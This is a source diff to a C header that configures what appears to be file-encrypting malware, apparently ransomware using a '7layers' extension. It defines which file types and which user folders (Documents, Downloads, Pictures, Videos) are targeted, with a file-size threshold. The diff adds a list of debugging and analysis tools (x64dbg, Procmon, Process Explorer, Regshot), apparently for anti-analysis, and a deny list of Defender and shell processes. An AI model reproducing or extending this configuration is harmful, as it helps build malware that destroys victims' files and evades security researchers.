@@ -1,16 +1,13 @@
 #pragma once
 
-#include "7layers.h"
+#include <windows.h>
 
 #define DEBUG_MODE 1
 
 // -------------------------------------------
 
-#pragma once
-
-#include "7layers.h"
-
 #define DEBUG_MODE 1
+#define THRESHOLD_FILE_SIZE 1024 * 1024 * 1024 * 1 // 1GB
 
 // -------------------------------------------
 
@@ -28,6 +25,15 @@ typedef enum FILE_TYPE {
     VDISK,
 } FILE_TYPE;
 
+typedef enum PROC_TYPE {
+    ANALYSIS,
+    MANAGEMENT,
+    DEBUG,
+    DEFENSE,
+    SERVICE,
+    TERMINAL,
+} PROC_TYPE;
+
 typedef struct _EXT_SCOPE {
     FILE_TYPE   type;
     const char* extension;
@@ -38,6 +44,11 @@ typedef struct _PATH_SCOPE {
     int         recursive;
     int         max_depth;
 } PATH_SCOPE;
+
+typedef struct _PROC_SCOPE {
+    PROC_TYPE   type;
+    const char* name;
+} PROC_SCOPE;
 
 // -------------------------------------------
 
@@ -105,6 +116,24 @@ static const EXT_SCOPE SCOPE_EXT_LIST[] = {
     // { GENERAL,  "7layers"   },      // Encrypted File
 };
 
+/*
+ * [ WARNING: PATH SCOPE RESTRICTIONS ]
+ *
+ * Using broad paths such as "%USERPROFILE%\\" will trigger
+ * conflicts with the HARD_DENY_PATH list.
+ *
+ * This behavior is intentional and serves as a safety
+ * measure to prevent operations outside the authorized scope.
+ *
+ * Modifying or removing HARD_DENY_PATH restrictions may
+ * compromise these safeguards and cause unintended damage.
+ *
+ * Anyone who modifies these protections assumes responsibility
+ * for the resulting consequences.
+ *
+ * Stay within the predefined boundaries.
+ */
+
 static const PATH_SCOPE SCOPE_PATH_LIST[] = {
     { "%USERPROFILE%\\Documents",   1, 5 },
     { "%USERPROFILE%\\Downloads",   1, 1 },
@@ -112,6 +141,22 @@ static const PATH_SCOPE SCOPE_PATH_LIST[] = {
     { "%USERPROFILE%\\Pictures",    1, 3 },
     { "%USERPROFILE%\\Videos",      1, 3 },
     // { "%USERPROFILE%\\OneDrive",    1, 3 }, // Conflict Test
+};
+
+static const PROC_SCOPE SCOPE_PROC_LIST[] = {
+    { DEBUG,        "x64dbg.exe"                },
+    { DEBUG,        "x32dbg.exe"                },
+    { DEBUG,        "x96dbg.exe"                },
+    { ANALYSIS,     "Procmon.exe"               },
+    { ANALYSIS,     "Procmon64.exe"             },
+    { ANALYSIS,     "Procmon64a.exe"            },
+    { ANALYSIS,     "procexp.exe"               },
+    { ANALYSIS,     "procexp64.exe"             },
+    { ANALYSIS,     "procexp64a.exe"            },
+    { ANALYSIS,     "Regshot-x64-ANSI.exe"      },
+    { ANALYSIS,     "Regshot-x64-Unicode.exe"   },
+    { ANALYSIS,     "Regshot-x86-ANSI.exe"      },
+    { ANALYSIS,     "Regshot-x86-Unicode.exe"   },
 };
 
 // -------------------------------------------
@@ -185,4 +230,13 @@ static const EXT_SCOPE HARD_DENY_EXT[] = {
 static const PATH_SCOPE HARD_DENY_PATH[] = {
     { "%USERPROFILE%\\OneDrive",    0, 0 },
     { "%USERPROFILE%\\AppData",     0, 0 },
+};
+
+static const PROC_SCOPE HARD_DENY_PROC[] = {
+    { DEFENSE,      "MsMpEng.exe"                   },
+    { DEFENSE,      "MpDefenderCoreService.exe"     },
+    { DEFENSE,      "NisSrv.exe"                    },
+    { TERMINAL,     "powershell.exe"                },
+    { TERMINAL,     "cmd.exe"                       },
+    // { ANALYSIS,     "x64dbg.exe"                    }, // Conflict Test
 };
